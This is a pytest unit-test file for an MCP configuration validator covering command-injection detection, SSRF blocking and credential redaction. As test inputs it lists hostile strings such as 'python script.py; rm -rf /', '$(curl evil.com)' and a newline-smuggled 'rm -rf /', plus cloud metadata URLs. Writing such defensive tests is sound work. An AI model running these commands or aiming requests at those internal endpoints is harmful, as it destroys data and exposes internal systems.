"""Unit tests for MCP config validator (TDD: RED phase).

Tests security validation for:
- Command injection detection
- SSRF prevention
- Credential sanitization
"""

from typing import TypeAlias, cast

import pytest

# Type alias for nested config structures returned by sanitize_credentials
NestedDict: TypeAlias = dict[str, str]
ServerDict: TypeAlias = dict[str, NestedDict]
ServersDict: TypeAlias = dict[str, ServerDict]


class TestCommandInjectionValidation:
    """Test command injection detection and prevention."""

    def test_validate_command_injection_detected(self) -> None:
        """Reject commands with shell metacharacters."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # Test various shell metacharacters
        dangerous_commands = [
            "python script.py; rm -rf /",  # Semicolon
            "node app.js && echo pwned",  # Double ampersand
            "cat file | grep secret",  # Pipe
            "$(curl evil.com)",  # Command substitution
            "`whoami`",  # Backtick command substitution
            "ls > output.txt",  # Redirection
            "echo $PATH",  # Variable expansion
            "rm -rf {home,root}",  # Brace expansion
            "cat file[0-9]",  # Bracket expansion
            "echo hello\nrm -rf /",  # Newline injection
            "echo test\\; rm -rf /",  # Escaped semicolon
        ]

        for command in dangerous_commands:
            with pytest.raises(ValueError, match="shell metacharacter"):
                validator.validate_command_injection(command)

    def test_validate_command_injection_safe_command(self) -> None:
        """Allow safe commands without metacharacters."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # Safe commands should pass validation
        safe_commands = [
            "python",
            "node app.js",
            "/usr/bin/python3 script.py",
            "npx github-mcp-server",
            "docker-compose up",
            "/opt/bin/server --port=8080",
        ]

        for command in safe_commands:
            # Should not raise
            result = validator.validate_command_injection(command)
            assert result == command

    def test_validate_command_injection_null(self) -> None:
        """Handle None command gracefully."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # None should be handled gracefully (no validation needed)
        result = validator.validate_command_injection(None)
        assert result is None


class TestSSRFPrevention:
    """Test SSRF prevention for URL validation."""

    def test_validate_ssrf_internal_ip(self) -> None:
        """Reject internal IP ranges (RFC 1918)."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # RFC 1918 private IP ranges
        internal_urls = [
            "http://10.0.0.1/api",  # 10.0.0.0/8
            "http://172.16.0.1/data",  # 172.16.0.0/12
            "http://192.168.1.1/admin",  # 192.168.0.0/16
            "http://10.255.255.255/",
            "http://172.31.255.255/",
            "http://192.168.255.255/",
        ]

        for url in internal_urls:
            with pytest.raises(ValueError, match="internal resource"):
                validator.validate_ssrf(url)

    def test_validate_ssrf_localhost(self) -> None:
        """Reject localhost and loopback addresses."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        localhost_urls = [
            "http://localhost/api",
            "http://127.0.0.1/",
            "http://127.0.0.2/",
            "http://127.255.255.255/",
            "http://[::1]/api",  # IPv6 loopback
        ]

        for url in localhost_urls:
            with pytest.raises(ValueError, match="internal resource"):
                validator.validate_ssrf(url)

    def test_validate_ssrf_metadata_endpoint(self) -> None:
        """Reject cloud metadata endpoints."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://instance-data/",  # Generic
        ]

        for url in metadata_urls:
            with pytest.raises(ValueError, match="internal resource"):
                validator.validate_ssrf(url)

    def test_validate_ssrf_link_local(self) -> None:
        """Reject link-local addresses."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        link_local_urls = [
            "http://169.254.0.1/",  # IPv4 link-local
            "http://[fe80::1]/",  # IPv6 link-local
        ]

        for url in link_local_urls:
            with pytest.raises(ValueError, match="internal resource"):
                validator.validate_ssrf(url)

    def test_validate_ssrf_valid_url(self) -> None:
        """Allow public URLs."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # Public URLs should pass validation
        valid_urls = [
            "http://example.com/api",
            "https://api.github.com/repos",
            "http://8.8.8.8/",  # Google DNS (public IP)
            "https://1.1.1.1/",  # Cloudflare DNS (public IP)
            "http://mcp-server.example.com:8080/",
        ]

        for url in valid_urls:
            # Should not raise
            result = validator.validate_ssrf(url)
            assert result == url

    def test_validate_ssrf_null(self) -> None:
        """Handle None URL gracefully."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        # None should be handled gracefully (no validation needed)
        result = validator.validate_ssrf(None)
        assert result is None


class TestCredentialSanitization:
    """Test credential sanitization for logging safety."""

    def test_sanitize_credentials_env_vars(self) -> None:
        """Redact sensitive environment variable keys."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        config: dict[str, object] = {
            "name": "github",
            "type": "stdio",
            "env": {
                "GITHUB_TOKEN": "ghp_secret123",
                "API_KEY": "sk-secret456",
                "SECRET_KEY": "secret789",
                "PASSWORD": "password123",
                "AUTH_TOKEN": "bearer_token",
                "SAFE_VALUE": "not_redacted",
            },
        }

        sanitized = validator.sanitize_credentials(config)

        # Cast nested env dict for type-safe access
        env = cast("NestedDict", sanitized["env"])

        # Sensitive keys should be redacted
        assert env["GITHUB_TOKEN"] == "***REDACTED***"
        assert env["API_KEY"] == "***REDACTED***"
        assert env["SECRET_KEY"] == "***REDACTED***"
        assert env["PASSWORD"] == "***REDACTED***"
        assert env["AUTH_TOKEN"] == "***REDACTED***"

        # Safe keys should be preserved
        assert env["SAFE_VALUE"] == "not_redacted"

    def test_sanitize_credentials_headers(self) -> None:
        """Redact sensitive header keys."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        config: dict[str, object] = {
            "name": "api-server",
            "type": "sse",
            "url": "http://example.com",
            "headers": {
                "Authorization": "Bearer secret_token",
                "X-API-Key": "sk-secret",
                "X-Auth-Token": "token123",
                "Content-Type": "application/json",  # Safe header
            },
        }

        sanitized = validator.sanitize_credentials(config)

        # Cast nested headers dict for type-safe access
        headers = cast("NestedDict", sanitized["headers"])

        # Sensitive headers should be redacted
        assert headers["Authorization"] == "***REDACTED***"
        assert headers["X-API-Key"] == "***REDACTED***"
        assert headers["X-Auth-Token"] == "***REDACTED***"

        # Safe headers should be preserved
        assert headers["Content-Type"] == "application/json"

    def test_sanitize_credentials_preserves_safe_fields(self) -> None:
        """Don't redact safe fields like command, type, name."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        config = {
            "name": "postgres-server",
            "type": "stdio",
            "command": "npx postgres-mcp-server",
            "args": ["--host", "localhost"],
            "enabled": True,
        }

        sanitized = validator.sanitize_credentials(config)

        # Safe fields should be unchanged
        assert sanitized["name"] == "postgres-server"
        assert sanitized["type"] == "stdio"
        assert sanitized["command"] == "npx postgres-mcp-server"
        assert sanitized["args"] == ["--host", "localhost"]
        assert sanitized["enabled"] is True

    def test_sanitize_credentials_nested(self) -> None:
        """Deep sanitization of nested structures."""
        from apps.api.services.mcp_config_validator import ConfigValidator

        validator = ConfigValidator()

        config: dict[str, object] = {
            "servers": {
                "github": {
                    "env": {
                        "TOKEN": "secret123",
                        "API_KEY": "secret456",
                    },
                },
                "slack": {
                    "headers": {
                        "Authorization": "Bearer token",
                    },
                },
            },
        }

        sanitized = validator.sanitize_credentials(config)

        # Cast nested structures for type-safe access
        servers = cast("ServersDict", sanitized["servers"])

        # Nested sensitive keys should be redacted
        assert servers["github"]["env"]["TOKEN"] == "***REDACTED***"
        assert servers["github"]["env"]["API_KEY"] == "***REDACTED***"
        assert servers["slack"]["headers"]["Authorization"] == "***REDACTED***"
